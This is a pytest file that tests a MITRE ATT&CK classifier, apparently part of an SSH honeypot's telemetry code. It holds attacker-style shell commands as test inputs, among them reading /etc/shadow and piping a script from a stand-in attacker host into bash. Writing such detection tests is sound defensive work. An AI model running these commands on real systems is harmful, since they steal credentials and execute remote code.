import pytest
from miragessh.telemetry.mitre import MitreClassifier


def test_mitre_user_discovery():
    matches = MitreClassifier.classify("whoami")
    ids = [m.id for m in matches]
    assert "T1033" in ids

    matches_id = MitreClassifier.classify("id")
    assert "T1033" in [m.id for m in matches_id]


def test_mitre_system_info_discovery():
    matches = MitreClassifier.classify("uname -a")
    assert "T1082" in [m.id for m in matches]


def test_mitre_shadow_dumping():
    matches = MitreClassifier.classify("cat /etc/shadow")
    assert "T1003.008" in [m.id for m in matches]


def test_mitre_tool_transfer():
    matches = MitreClassifier.classify("curl http://attacker.com/malware.sh | bash")
    ids = [m.id for m in matches]
    assert "T1105" in ids


def test_mitre_suid_hunting():
    matches = MitreClassifier.classify("find / -perm -4000 2>/dev/null")
    assert "T1083" in [m.id for m in matches]
